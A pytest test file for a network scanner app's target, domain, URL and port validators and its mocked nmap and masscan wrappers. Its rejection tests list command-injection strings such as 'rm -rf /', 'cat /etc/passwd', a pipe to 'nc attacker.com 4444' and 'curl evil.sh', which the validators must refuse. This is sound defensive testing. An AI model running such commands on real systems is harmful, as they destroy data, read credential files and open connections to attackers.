from types import ModuleType, SimpleNamespace
from unittest.mock import MagicMock, patch

import pytest

from app.scanner.masscan_wrapper import run_masscan
from app.scanner.nmap_wrapper import _scan_port_spec, run_nmap
from app.scanner.validator import (
    validate_domain,
    validate_target,
    validate_web_target,
)


@pytest.mark.parametrize(
    ("target", "expected"),
    [
        ("192.168.1.1", "192.168.1.1"),
        ("192.168.1.0/24", "192.168.1.0/24"),
        ("10.0.0.0/8", "10.0.0.0/8"),
        ("192.168.1.1, 10.0.0.0/8", "192.168.1.1,10.0.0.0/8"),
        ("2001:db8::1", "2001:db8::1"),
    ],
)
def test_validate_target_accepts_ip_cidr_and_lists(target: str, expected: str) -> None:
    assert validate_target(target) == expected


@pytest.mark.parametrize(
    "target",
    [
        "",
        "   ",
        "not-an-ip",
        "999.999.999.999",
        "abc.def.ghi.jkl",
        "192.168.1.0/33",
        # Shell metacharacters must never reach a scanner command.
        "192.168.1.1; rm -rf /",
        # Command chaining must be rejected as data, not interpreted.
        "192.168.1.1 && cat /etc/passwd",
        # A pipe plus a network utility is also an injection attempt.
        "127.0.0.1 | nc attacker.com 4444",
        "10.0.0.1,,10.0.0.2",
    ],
)
def test_validate_target_rejects_invalid_values(target: str) -> None:
    with pytest.raises(ValueError):
        validate_target(target)


def test_validate_target_rejects_oversized_cidr() -> None:
    with pytest.raises(ValueError, match="invalid target"):
        validate_target("192.168.1.0/999")


def test_validate_target_rejects_very_long_input() -> None:
    # Limiting input length prevents expensive parsing of attacker-controlled data.
    with pytest.raises(ValueError, match="too long"):
        validate_target("1" * 4097)


@pytest.mark.parametrize("ports", ["80", "1-1024", "22,80,443"])
def test_validate_ports_accepts_numeric_specs(ports: str) -> None:
    from app.scanner.validator import validate_ports

    assert validate_ports(ports) == ports


@pytest.mark.parametrize("ports", ["", "0", "65536", "80-", "80; cat /etc/passwd"])
def test_validate_ports_rejects_unsafe_specs(ports: str) -> None:
    from app.scanner.validator import validate_ports

    with pytest.raises(ValueError):
        validate_ports(ports)


def test_validate_domain_accepts_valid_fqdns() -> None:
    assert validate_domain("example.com") == "example.com"
    assert validate_domain("sub.example.com") == "sub.example.com"
    assert validate_domain("deep.sub.example.co.uk") == "deep.sub.example.co.uk"
    assert validate_domain("Example.COM") == "example.com"
    assert validate_domain("sub.example.com.") == "sub.example.com"


@pytest.mark.parametrize(
    "domain",
    [
        "",
        "   ",
        "example",
        "not a domain",
        "-example.com",
        "example-.com",
        ".example.com",
        "example..com",
        "example.com; rm -rf /",
        "example.com && cat /etc/passwd",
        "example.com | nc attacker.com 4444",
        "example.com$PATH",
        "sp ace.example.com",
    ],
)
def test_validate_domain_rejects_invalid_values(domain: str) -> None:
    with pytest.raises(ValueError):
        validate_domain(domain)


def test_validate_domain_rejects_oversized_value() -> None:
    with pytest.raises(ValueError, match="too long"):
        validate_domain(f"{'a' * 60}.com" * 5)


def test_validate_domain_rejects_injection_characters() -> None:
    for char in (";", "|", "&", "$", "`", " "):
        with pytest.raises(ValueError, match="forbidden"):
            validate_domain(f"example{char}com")


def test_validate_web_target_accepts_urls_hosts_and_ips() -> None:
    assert validate_web_target("https://example.com") == "https://example.com"
    assert validate_web_target("http://example.com") == "http://example.com"
    assert validate_web_target("http://1.2.3.4:8080") == "http://1.2.3.4:8080"
    assert (
        validate_web_target("https://sub.example.com:8443")
        == "https://sub.example.com:8443"
    )
    assert validate_web_target("example.com") == "example.com"
    assert validate_web_target("1.2.3.4") == "1.2.3.4"
    assert validate_web_target("HTTPS://Example.COM") == "https://example.com"


@pytest.mark.parametrize(
    "target",
    [
        "",
        "   ",
        "not a url with space",
        "file:///etc/passwd",
        "ftp://example.com",
        "example.com; rm -rf /",
        "https://example.com && curl evil.sh",
        "https://:8080",
        "http://example.com:99999",
        "httpx -list /etc/hosts",
    ],
)
def test_validate_web_target_rejects_unsafe_values(target: str) -> None:
    with pytest.raises(ValueError):
        validate_web_target(target)


def test_nmap_port_spec_keeps_masscan_ports_and_adds_os_discovery_range() -> None:
    assert _scan_port_spec("80,443,8080") == "1-1024,12345,54321,80,443,8080"
    assert _scan_port_spec("1-1024,12345") == "1-1024,12345,54321"


def test_masscan_wrapper_uses_validated_arguments() -> None:
    scanner = SimpleNamespace(
        scan=lambda *args, **kwargs: None,
        scan_result={
            "scan": {"192.168.1.1": {"tcp": {"80": {"state": "open", "name": "http"}}}}
        },
    )
    masscan_module = ModuleType("masscan")
    masscan_module.PortScanner = lambda: scanner  # type: ignore[attr-defined]

    with (
        patch(
            "app.scanner.masscan_wrapper.importlib.import_module",
            return_value=masscan_module,
        ),
        patch.object(scanner, "scan") as scan,
    ):
        result = run_masscan("192.168.1.1", ports="80")

    scan.assert_called_once_with("192.168.1.1", ports="80")
    assert result.scanned_ports[0].port == 80
    assert result.scanned_ports[0].service == "http"


def test_masscan_wrapper_parses_standard_json_response() -> None:
    scanner = SimpleNamespace(
        scan=MagicMock(),
        scan_result={
            "scan": {
                "192.168.1.1": [
                    {"status": "open", "port": 22, "proto": "tcp"},
                    {"status": "closed", "port": 23, "proto": "tcp"},
                ]
            }
        },
    )
    masscan_module = ModuleType("masscan")
    masscan_module.PortScanner = lambda: scanner  # type: ignore[attr-defined]

    with patch(
        "app.scanner.masscan_wrapper.importlib.import_module",
        return_value=masscan_module,
    ):
        result = run_masscan("192.168.1.1", ports="22-23")

    assert [(port.port, port.protocol) for port in result.scanned_ports] == [
        (22, "tcp")
    ]


def test_masscan_wrapper_parses_python_masscan_nested_ports() -> None:
    scanner = SimpleNamespace(
        scan=MagicMock(),
        scan_result={
            "scan": {
                "92.53.106.219": [
                    {
                        "ip": "92.53.106.219",
                        "ports": [
                            {"port": 80, "proto": "tcp", "status": "open"},
                            {"port": 21, "proto": "tcp", "status": "open"},
                            {"port": 23, "proto": "tcp", "status": "closed"},
                        ],
                    }
                ]
            }
        },
    )
    masscan_module = ModuleType("masscan")
    masscan_module.PortScanner = lambda: scanner  # type: ignore[attr-defined]

    with patch(
        "app.scanner.masscan_wrapper.importlib.import_module",
        return_value=masscan_module,
    ):
        result = run_masscan("92.53.106.219", ports="1-1000")

    assert [port.port for port in result.scanned_ports] == [80, 21]


def test_masscan_wrapper_parses_json_string_output() -> None:
    scanner = SimpleNamespace(
        scan=MagicMock(),
        scan_result='{"scan":{"92.53.106.219":[{"port":80,"proto":"tcp","status":"open"}]}}',
    )
    masscan_module = ModuleType("masscan")
    masscan_module.PortScanner = lambda: scanner  # type: ignore[attr-defined]

    with patch(
        "app.scanner.masscan_wrapper.importlib.import_module",
        return_value=masscan_module,
    ):
        result = run_masscan("92.53.106.219", ports="80")

    assert [(port.port, port.protocol) for port in result.scanned_ports] == [
        (80, "tcp")
    ]


def test_masscan_wrapper_parses_empty_response() -> None:
    scanner = SimpleNamespace(scan=MagicMock(), scan_result={"scan": {}})
    masscan_module = ModuleType("masscan")
    masscan_module.PortScanner = lambda: scanner  # type: ignore[attr-defined]

    with patch(
        "app.scanner.masscan_wrapper.importlib.import_module",
        return_value=masscan_module,
    ):
        result = run_masscan("192.168.1.1")

    assert result.scanned_ports == []


def test_masscan_wrapper_rejects_broken_json_shape() -> None:
    # Missing the required port field models truncated or malformed scanner JSON.
    scanner = SimpleNamespace(
        scan=MagicMock(),
        scan_result={"scan": {"192.168.1.1": [{"status": "open"}]}},
    )
    masscan_module = ModuleType("masscan")
    masscan_module.PortScanner = lambda: scanner  # type: ignore[attr-defined]

    with (
        patch(
            "app.scanner.masscan_wrapper.importlib.import_module",
            return_value=masscan_module,
        ),
        pytest.raises(RuntimeError, match="Masscan scan failed"),
    ):
        run_masscan("192.168.1.1")


def test_masscan_wrapper_reports_missing_dependency() -> None:
    with (
        patch(
            "app.scanner.masscan_wrapper.importlib.import_module",
            side_effect=ModuleNotFoundError("masscan"),
        ),
        pytest.raises(RuntimeError, match="python-masscan"),
    ):
        run_masscan("127.0.0.1")


def test_nmap_wrapper_uses_library_api() -> None:
    process = SimpleNamespace(stdout="nmap output", run=lambda: None)
    nmap_process_module = ModuleType("libnmap.process")
    nmap_process_module.NmapProcess = lambda **kwargs: process  # type: ignore[attr-defined]
    service = SimpleNamespace(
        port=22,
        protocol="tcp",
        service="ssh",
        service_product="OpenSSH",
        service_version="9.0",
    )
    host = SimpleNamespace(
        services=[service],
        os=SimpleNamespace(osmatches=[SimpleNamespace(name="Linux")]),
    )
    nmap_parser_module = ModuleType("libnmap.parser")
    nmap_parser_module.NmapParser = SimpleNamespace(  # type: ignore[attr-defined]
        parse=lambda output: SimpleNamespace(hosts=[host])
    )

    with (
        patch(
            "app.scanner.nmap_wrapper.importlib.import_module",
            side_effect=[nmap_process_module, nmap_parser_module],
        ),
        patch.object(process, "run") as run,
    ):
        result = run_nmap("10.0.0.0/24", ports="22,80")

    run.assert_called_once_with()
    assert result.target == "10.0.0.0/24"
    assert result.services[0].version == "OpenSSH 9.0"
    assert result.os_detection == "Linux"


def test_nmap_wrapper_reads_service_dict_name() -> None:
    process = SimpleNamespace(stdout="nmap output", run=MagicMock())
    nmap_process_module = ModuleType("libnmap.process")
    nmap_process_module.NmapProcess = lambda **kwargs: process  # type: ignore[attr-defined]
    service = SimpleNamespace(
        port=443,
        protocol="tcp",
        service="",
        service_dict={"name": "https"},
        service_product="",
        service_version="",
    )
    host = SimpleNamespace(services=[service], os=SimpleNamespace(osmatches=[]))
    nmap_parser_module = ModuleType("libnmap.parser")
    nmap_parser_module.NmapParser = SimpleNamespace(  # type: ignore[attr-defined]
        parse=lambda output: SimpleNamespace(hosts=[host])
    )

    with patch(
        "app.scanner.nmap_wrapper.importlib.import_module",
        side_effect=[nmap_process_module, nmap_parser_module],
    ):
        result = run_nmap("8.8.8.8", ports="443")

    assert result.services[0].service == "https"


def test_nmap_wrapper_parses_deep_scan_metadata() -> None:
    process = SimpleNamespace(
        stdout=(
            "<nmaprun><host><trace>"
            '<hop ttl="1" ipaddr="192.0.2.254" host="gateway" rtt="1.2"/>'
            "</trace></host></nmaprun>"
        ),
        run=MagicMock(),
    )
    nmap_process_module = ModuleType("libnmap.process")
    nmap_process_module.NmapProcess = lambda **kwargs: process  # type: ignore[attr-defined]
    service = SimpleNamespace(
        port=80,
        protocol="tcp",
        service="http",
        service_product="nginx",
        service_version="1.25",
        scripts_results=[{"id": "http-title", "output": "Title: Example"}],
    )
    host = SimpleNamespace(
        services=[service],
        scripts_results=[{"id": "ssl-cert", "output": "Issuer: Example CA"}],
        os=SimpleNamespace(
            osmatches=[SimpleNamespace(name="Linux 5.4", accuracy="95")]
        ),
    )
    nmap_parser_module = ModuleType("libnmap.parser")
    nmap_parser_module.NmapParser = SimpleNamespace(  # type: ignore[attr-defined]
        parse=lambda output: SimpleNamespace(hosts=[host])
    )

    with patch(
        "app.scanner.nmap_wrapper.importlib.import_module",
        side_effect=[nmap_process_module, nmap_parser_module],
    ):
        result = run_nmap("192.0.2.1", ports="80")

    assert result.os_detection == "Linux 5.4 (95%)"
    assert result.scripts_output == {
        "http-title": "Title: Example",
        "ssl-cert": "Issuer: Example CA",
    }
    assert result.traceroute[0].ip == "192.0.2.254"
    assert result.traceroute[0].hostname == "gateway"


def test_nmap_wrapper_parses_empty_report() -> None:
    process = SimpleNamespace(stdout="<nmaprun />", run=MagicMock())
    nmap_process_module = ModuleType("libnmap.process")
    nmap_process_module.NmapProcess = lambda **kwargs: process  # type: ignore[attr-defined]
    nmap_parser_module = ModuleType("libnmap.parser")
    nmap_parser_module.NmapParser = SimpleNamespace(  # type: ignore[attr-defined]
        parse=lambda output: SimpleNamespace(hosts=[])
    )

    with patch(
        "app.scanner.nmap_wrapper.importlib.import_module",
        side_effect=[nmap_process_module, nmap_parser_module],
    ):
        result = run_nmap("192.168.1.1")

    assert result.services == []
    assert result.os_detection == "Unknown (Filtered)"


def test_nmap_wrapper_rejects_broken_xml_response() -> None:
    process = SimpleNamespace(stdout="<nmaprun", run=MagicMock())
    nmap_process_module = ModuleType("libnmap.process")
    nmap_process_module.NmapProcess = lambda **kwargs: process  # type: ignore[attr-defined]
    parser = MagicMock()
    parser.parse.side_effect = ValueError("incomplete XML")
    nmap_parser_module = ModuleType("libnmap.parser")
    nmap_parser_module.NmapParser = parser  # type: ignore[attr-defined]

    with (
        patch(
            "app.scanner.nmap_wrapper.importlib.import_module",
            side_effect=[nmap_process_module, nmap_parser_module],
        ),
        pytest.raises(RuntimeError, match="Nmap scan failed"),
    ):
        run_nmap("192.168.1.1")


def test_nmap_wrapper_rejects_unsafe_ports_before_import() -> None:
    with pytest.raises(ValueError):
        run_nmap("127.0.0.1", ports="80; --script evil")


def _nmap_process_modules(
    parser_hosts: object,
) -> tuple[ModuleType, ModuleType, ModuleType, dict[str, object]]:
    process = SimpleNamespace(stdout="nmap output", run=MagicMock())
    captured: dict[str, object] = {}
    nmap_process_module = ModuleType("libnmap.process")
    nmap_process_module.NmapProcess = (
        lambda **kwargs: captured.update(kwargs) or process  # type: ignore[attr-defined]
    )
    nmap_parser_module = ModuleType("libnmap.parser")
    nmap_parser_module.NmapParser = SimpleNamespace(  # type: ignore[attr-defined]
        parse=lambda output: SimpleNamespace(hosts=parser_hosts)
    )
    return nmap_process_module, nmap_parser_module, process, captured


def test_nmap_wrapper_passes_script_categories_and_extended_timeouts() -> None:
    service = SimpleNamespace(
        port=21,
        protocol="tcp",
        service="ftp",
        service_product="",
        service_version="",
        scripts_results=[],
    )
    host = SimpleNamespace(
        services=[service], scripts_results=[], os=SimpleNamespace(osmatches=[])
    )
    process_module, parser_module, _, captured = _nmap_process_modules([host])

    with patch(
        "app.scanner.nmap_wrapper.importlib.import_module",
        side_effect=[process_module, parser_module],
    ):
        result = run_nmap("192.168.1.1", ports="21")

    options = str(captured["options"])
    assert "--script=auth,discovery,broadcast" in options
    assert "--host-timeout 30m" in options
    assert "--script-timeout 5m" in options
    assert result.has_anonymous_access is False


def test_nmap_wrapper_accepts_custom_script_categories() -> None:
    service = SimpleNamespace(
        port=80,
        protocol="tcp",
        service="http",
        service_product="",
        service_version="",
        scripts_results=[],
    )
    host = SimpleNamespace(
        services=[service], scripts_results=[], os=SimpleNamespace(osmatches=[])
    )
    process_module, parser_module, _, captured = _nmap_process_modules([host])

    with patch(
        "app.scanner.nmap_wrapper.importlib.import_module",
        side_effect=[process_module, parser_module],
    ):
        run_nmap("192.168.1.1", ports="80", script_categories=["discovery"])

    assert "--script=discovery" in str(captured["options"])


def test_nmap_wrapper_rejects_invalid_script_categories() -> None:
    for categories in (
        [],
        [""],
        ["vuln; rm -rf /"],
        ["discovery", "--script evil"],
        ["UPPER"],
    ):
        with pytest.raises(ValueError, match="script category"):
            run_nmap("192.168.1.1", script_categories=categories)


def test_nmap_wrapper_detects_anonymous_ftp_access() -> None:
    process = SimpleNamespace(stdout="nmap output", run=MagicMock())
    nmap_process_module = ModuleType("libnmap.process")
    nmap_process_module.NmapProcess = lambda **kwargs: process  # type: ignore[attr-defined]
    service = SimpleNamespace(
        port=21,
        protocol="tcp",
        service="ftp",
        service_product="",
        service_version="",
        scripts_results=[
            {
                "id": "ftp-anon",
                "output": "Anonymous FTP login allowed (FTP code 230)",
            }
        ],
    )
    host = SimpleNamespace(
        services=[service], scripts_results=[], os=SimpleNamespace(osmatches=[])
    )
    nmap_parser_module = ModuleType("libnmap.parser")
    nmap_parser_module.NmapParser = SimpleNamespace(  # type: ignore[attr-defined]
        parse=lambda output: SimpleNamespace(hosts=[host])
    )

    with patch(
        "app.scanner.nmap_wrapper.importlib.import_module",
        side_effect=[nmap_process_module, nmap_parser_module],
    ):
        result = run_nmap("192.168.1.1", ports="21")

    assert (
        result.scripts_output["ftp-anon"]
        == "Anonymous FTP login allowed (FTP code 230)"
    )
    assert result.has_anonymous_access is True


def test_nmap_wrapper_does_not_treat_closed_ftp_as_anonymous() -> None:
    process = SimpleNamespace(stdout="nmap output", run=MagicMock())
    nmap_process_module = ModuleType("libnmap.process")
    nmap_process_module.NmapProcess = lambda **kwargs: process  # type: ignore[attr-defined]
    host = SimpleNamespace(
        services=[],
        scripts_results=[{"id": "ftp-anon", "output": "FTP 530 login denied"}],
        os=SimpleNamespace(osmatches=[]),
    )
    nmap_parser_module = ModuleType("libnmap.parser")
    nmap_parser_module.NmapParser = SimpleNamespace(  # type: ignore[attr-defined]
        parse=lambda output: SimpleNamespace(hosts=[host])
    )

    with patch(
        "app.scanner.nmap_wrapper.importlib.import_module",
        side_effect=[nmap_process_module, nmap_parser_module],
    ):
        result = run_nmap("192.168.1.1", ports="21")

    assert result.has_anonymous_access is False


def test_nmap_wrapper_extracts_scripts_from_xml_fallback() -> None:
    xml_output = (
        "<nmaprun><host><script id='broadcast-dhcp-discover' output='Got answer'/>"
        "</host></nmaprun>"
    )
    process = SimpleNamespace(stdout=xml_output, run=MagicMock())
    nmap_process_module = ModuleType("libnmap.process")
    nmap_process_module.NmapProcess = lambda **kwargs: process  # type: ignore[attr-defined]
    empty_host = SimpleNamespace(
        services=[], scripts_results=[], os=SimpleNamespace(osmatches=[])
    )
    nmap_parser_module = ModuleType("libnmap.parser")
    nmap_parser_module.NmapParser = SimpleNamespace(  # type: ignore[attr-defined]
        parse=lambda output: SimpleNamespace(hosts=[empty_host])
    )

    with patch(
        "app.scanner.nmap_wrapper.importlib.import_module",
        side_effect=[nmap_process_module, nmap_parser_module],
    ):
        result = run_nmap("192.168.1.1")

    assert result.scripts_output["broadcast-dhcp-discover"] == "Got answer"
    assert result.traceroute == []
